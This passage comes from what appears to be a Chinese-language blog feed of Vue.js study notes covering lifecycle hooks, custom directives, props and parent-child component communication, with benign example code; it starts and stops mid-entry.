<li><p><code>beforeDestroy</code>：清除定时器、解绑自定义事件、取消订阅消息等收尾工作</p>
</li>
</ul>
<p>关于销毁Vue实例：</p>
<ul>
<li><p>销毁后借助Vue开发者工具看不到任何信息</p>
</li>
<li><p>销毁后自定义事件会失效，但原生DOM事件依然有效</p>
</li>
<li><p>一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了</p>
</li>
</ul>
<p><strong>测试案例</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>生命周期测试案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeMsg&quot;</span>&gt;</span>改变msg<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">message</span>: <span class="string">&#x27;你好呀~~~&#x27;</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			changeMsg () &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">message</span> = <span class="string">&#x27;拜拜咯~~~&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 生命周期钩子</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------初始化前------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		created () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------初始化完成------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		beforeMount () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------挂载前---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		mounted () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------挂载完成---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		beforeUpdate () &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------更新前---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">updated</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;------更新后---------&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg = &quot;</span>, <span class="variable language_">this</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;el = &quot;</span>, <span class="variable language_">this</span>.<span class="property">$el</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144334.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144337.png" alt="  "></p>
<p><strong>从上面我们可以看出几点：</strong></p>
<ul>
<li>首次只执行了4个生命周期，<code>beforeCreate</code>，<code>created</code>, <code>beforeMount</code>, <code>mounted</code>；</li>
<li>在第一个生命周期<code>beforeCreate</code>，拿不到data中的数据，此时数据还未初始化；</li>
<li><code>created</code>中，可以拿到data中的message数据了，此时数据初始化已经完成</li>
</ul>
<h1 id="十、自定义指令"><a href="#十、自定义指令" class="headerlink" title="十、自定义指令"></a>十、自定义指令</h1><p><strong>注册一个自定义指令有全局注册与局部注册。</strong></p>
<h2 id="1-局部注册"><a href="#1-局部注册" class="headerlink" title="1. 局部注册"></a>1. 局部注册</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;															</span><br><span class="line">	<span class="attr">directives</span>:&#123;指令名:配置对象&#125;   </span><br><span class="line">&#125;) 		</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;															</span><br><span class="line">	<span class="attr">directives</span>:&#123;指令名:回调函数&#125;   </span><br><span class="line">&#125;) 	</span><br></pre></td></tr></table></figure>

<p><strong>测试案例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</span></span><br><span class="line"><span class="comment">	需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">directives</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 自定义指令</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">big</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big&#x27;</span>,<span class="variable language_">this</span>) <span class="comment">//注意此处的this是window</span></span></span><br><span class="line"><span class="language-javascript">			element.<span class="property">innerText</span> = binding.<span class="property">value</span> * <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">fbind</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">bind</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">inserted</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="title function_">focus</span>()</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">update</span>(<span class="params">element,binding</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				element.<span class="property">value</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="2-全局注册"><a href="#2-全局注册" class="headerlink" title="2. 全局注册"></a>2. 全局注册</h2><p><strong>全局注册注册主要是用过<code>Vue.directive</code>方法进行注册</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span><br><span class="line">	<span class="comment">//指令与元素成功绑定时（一上来）</span></span><br><span class="line">	<span class="title function_">bind</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">//指令所在元素被插入页面时</span></span><br><span class="line">	<span class="title function_">inserted</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="title function_">focus</span>()</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">//指令所在的模板被重新解析时</span></span><br><span class="line">	<span class="title function_">update</span>(<span class="params">element,binding</span>)&#123;</span><br><span class="line">		element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-钩子函数"><a href="#3-钩子函数" class="headerlink" title="3. 钩子函数"></a>3. 钩子函数</h2><p><strong>自定义指令也像组件那样存在钩子函数：</strong></p>
<ul>
<li><code>bind</code>：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置</li>
<li><code>inserted</code>：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)</li>
<li><code>update</code>：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新</li>
<li><code>componentUpdated</code>：指令所在组件的 VNode 及其子 VNode 全部更新后调用</li>
<li><code>unbind</code>：只调用一次，指令与元素解绑时调用</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li><p>指令定义时不加<code>v-</code>，但使用时要加<code>v-</code></p>
</li>
<li><p>指令名如果是多个单词，要使用&#x3D;&#x3D;kebab-case&#x3D;&#x3D;命名方式，不要用&#x3D;&#x3D;camelCase&#x3D;&#x3D;命名</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架总结（四、CLI编程组件通信）</title>
    <url>/posts/97b300c3.html</url>
    <content><![CDATA[<h1 id="一、-props配置项"><a href="#一、-props配置项" class="headerlink" title="一、 props配置项"></a>一、 props配置项</h1><p><strong>props配置项：</strong></p>
<ul>
<li><p>功能：让组件接收外部传过来的数据</p>
</li>
<li><p>传递数据：<code>&lt;Student name=&quot;xxx&quot;/&gt;</code></p>
</li>
<li><p>接收数据：</p>
</li>
</ul>
<p>① 第一种方式（只接收）：<code>props:[&#39;name&#39;]</code></p>
<p>② 第二种方式（限制数据类型）：<code>props:&#123;name:String&#125;</code></p>
<p>③ 第三种方式（限制类型、限制必要性、指定默认值）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">	<span class="attr">name</span>:&#123;</span><br><span class="line">		<span class="attr">type</span>:<span class="title class_">String</span>, 	<span class="comment">//类型</span></span><br><span class="line">		<span class="attr">required</span>:<span class="literal">true</span>,  <span class="comment">//必要性</span></span><br><span class="line">		<span class="attr">default</span>:<span class="string">&#x27;划水艺术家&#x27;</span>  <span class="comment">//默认值</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试案例：</strong></p>
<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--使用 props 传递数据--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Student</span> <span class="attr">name</span>=<span class="string">&quot;划水艺术家&quot;</span> <span class="attr">age</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong><code>src/components/Student.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 简单声明接收</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// props:[&#x27;name&#x27;,&#x27;age&#x27;]</span></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 接收的同时对数据进行类型限制</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">/* props:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">			name:String,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">			age:Number</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">	&#125; */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 接收的同时对数据进行类型限制 + 指定默认值 + 限制必要性</span></span></span><br><span class="line"><span class="language-javascript">	<span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">name</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">type</span>: <span class="title class_">String</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">required</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">age</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">type</span>: <span class="title class_">Number</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">default</span>: <span class="number">99</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145011.png" alt="  "></p>
<blockquote>
<p><strong>props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据</strong></p>
</blockquote>
<hr>
<h1 id="二、-父子组件通信"><a href="#二、-父子组件通信" class="headerlink" title="二、 父子组件通信"></a>二、 父子组件通信</h1><h2 id="1-父组件向子组件通信"><a href="#1-父组件向子组件通信" class="headerlink" title="1. 父组件向子组件通信"></a>1. 父组件向子组件通信</h2><p>子组件无法直接使用父组件中的数据，如果需要使用，则必须由父组件把数据传递给子组件才可以。<br>本质: 让子组件中的属性与父组件中的属性进行关联绑定, 然后子组件使用该属性, 这样才能做到数据传递。</p>
<p><strong>测试案例：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145015.png" alt="  "></p>
<p><strong><code>src/components/Child.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>子组件引用父组件数据<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--向子组件通信--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child</span> <span class="attr">name</span>=<span class="string">&quot;划水艺术家&quot;</span> <span class="attr">age</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Child</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145018.png" alt="  "></p>
<hr>
<h2 id="2-子组件向父组件通信"><a href="#2-子组件向父组件通信" class="headerlink" title="2. 子组件向父组件通信"></a>2. 子组件向父组件通信</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145020.png" alt="****"></p>
<h3 id="①-基础方法"><a href="#①-基础方法" class="headerlink" title="① 基础方法"></a>① 基础方法</h3><p>子组件无法直接给父组件传递数据，也无法操作父组件中的数据，更无法调用父组件中的方法。<br>所以,，所谓的子组件向父组件通讯，其实就是想办法让子组件调用父组件的方法，进而响应到父组件中的数据。</p>
<p><strong>测试案例：</strong></p>
<p><strong><code>src/components/Child.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>子组件向父组件通信<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;childFunc&quot;</span>&gt;</span>点我年龄 + 1 并将姓名传送至父组件 App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 其中 func 为父组件向子组件传递的方法</span></span></span><br><span class="line"><span class="language-javascript">	<span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span 